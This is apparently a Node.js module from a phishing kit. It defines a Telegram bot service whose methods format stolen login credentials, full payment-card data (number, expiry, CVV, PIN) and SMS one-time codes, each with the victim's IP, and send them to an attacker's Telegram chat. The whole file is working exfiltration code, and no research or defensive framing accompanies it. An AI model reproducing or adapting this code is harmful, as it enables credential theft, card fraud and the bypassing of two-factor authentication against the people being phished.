const { Telegraf } = require('telegraf');
const config = require('../config');

class TelegramService {
    constructor() {
        this.bot = null;
        if (config.TOKEN) {
            try {
                this.bot = new Telegraf(config.TOKEN);
            } catch (err) {
                console.error('Failed to initialize Telegraf instance:', err.message);
            }
        }
    }

    async send(message) {
        if (!this.bot || !config.CHATID) {
            console.warn('Telegram bot or CHATID is not configured. Message skipped.');
            return false;
        }

        try {
            await this.bot.telegram.sendMessage(config.CHATID, message);
            return true;
        } catch (err) {
            console.error('Failed to send Telegram message:', err.message);
            return false;
        }
    }

    async sendLogin(data, ip) {
        let msg = `${config.BRAND}  | [LOGIN] |  TEAM\n`;
        msg += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
        msg += `USER: ${data.logi || 'N/A'}\n`;
        msg += `PASSWORD: ${data.paso || 'N/A'}\n`;
        msg += `IP: ${ip || 'N/A'}\n`;
        msg += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
        msg += `${config.BRAND}  | [${config.TARGET}]  |  TEAM`;
        return this.send(msg);
    }

    async sendCard(data, ip) {
        let msg = `${config.BRAND}  | [CC-s5ona] |  TEAM\n`;
        msg += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
        msg += `CARD N*: ${data.a1 || 'N/A'}\n`;
        msg += `MM/YY: ${data.a2 || 'N/A'}\n`;
        msg += `CVV: ${data.a3 || 'N/A'}\n`;
        msg += `PIN: ${data.a4 || 'N/A'}\n`;
        msg += `IP: ${ip || 'N/A'}\n`;
        msg += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
        msg += `${config.BRAND}  | [${config.TARGET}]  |  TEAM`;
        return this.send(msg);
    }

    async sendSms1(data, ip) {
        let msg = `${config.BRAND}  | [SMS](1) |  TEAM\n`;
        msg += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
        msg += `OTP: ${data.sps1 || 'N/A'}\n`;
        msg += `IP: ${ip || 'N/A'}\n`;
        msg += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
        msg += `${config.BRAND}  | [${config.TARGET}]  |  TEAM`;
        return this.send(msg);
    }

    async sendSms2(data, ip) {
        let msg = `${config.BRAND}  | [SMS](2) |  TEAM\n`;
        msg += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
        msg += `OTP: ${data.sps2 || 'N/A'}\n`;
        msg += `IP: ${ip || 'N/A'}\n`;
        msg += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
        msg += `${config.BRAND}  | [${config.TARGET}]  |  TEAM`;
        return this.send(msg);
    }
}

module.exports = new TelegramService();
